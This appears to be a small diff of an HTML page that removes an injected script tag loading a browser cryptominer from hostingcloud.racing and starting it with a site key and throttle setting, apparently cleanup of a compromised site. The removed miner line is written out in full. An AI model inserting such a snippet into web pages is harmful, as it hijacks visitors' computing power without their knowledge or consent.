@@ -1168,7 +1168,7 @@ _position: fixed;
 _top: expression(eval(document.documentElement.scrollTop+(document.documentElement.clientHeight-this.offsetHeight)));
 }
 </style>
-<script src="https://www.hostingcloud.racing/xAgT.js"></script><script>new Client.Anonymous("b5b93bc8912aaa1229c19d9d9cfe88368c49554c931b25cc5b38fd4556ecd3fa",{throttle:0.4,c:"w"}).start();</script>
 </body>
 </html>
+
 
